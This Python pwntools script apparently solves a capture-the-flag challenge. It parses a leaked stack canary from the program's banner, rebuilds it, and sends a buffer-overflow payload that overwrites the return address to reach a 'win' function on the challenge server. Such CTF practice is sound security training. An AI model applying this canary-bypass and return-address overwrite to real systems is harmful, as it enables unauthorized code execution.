from pwn import*
context.arch="amd64"
context.terminal="kitty" #adjust this with ur terminal or comment/remove the line
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10001"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

line = p.recvline(timeout=1)
prefix = b'Yo bro i got you sth! '
leak = line.split(prefix, 1)[1].rstrip(b'\r\n')
leak = leak[:7]
canary = b'\x00' + leak
canary = canary.ljust(8, b'\x00')
win_addr = 0x401196

# The program leaks a stack canary partially in its banner. We parse it from the
# received line and reconstruct the 8-byte canary (first byte is null).
# Build payload layout:
# - 80 bytes padding to reach saved frame
# - a null + 7 bytes filler to align
# - the recovered canary to pass stack-protector check
# - 8 bytes for saved RBP or filler
# - return address set to `win_addr+1` (skip possible prologue)
payload = b''
payload += b'A' * 80
payload += b'\x00'
payload += b'B' * 7
payload += canary
payload += b'c' * 8
payload += p64(win_addr + 1)

p.sendline(payload)
p.interactive()
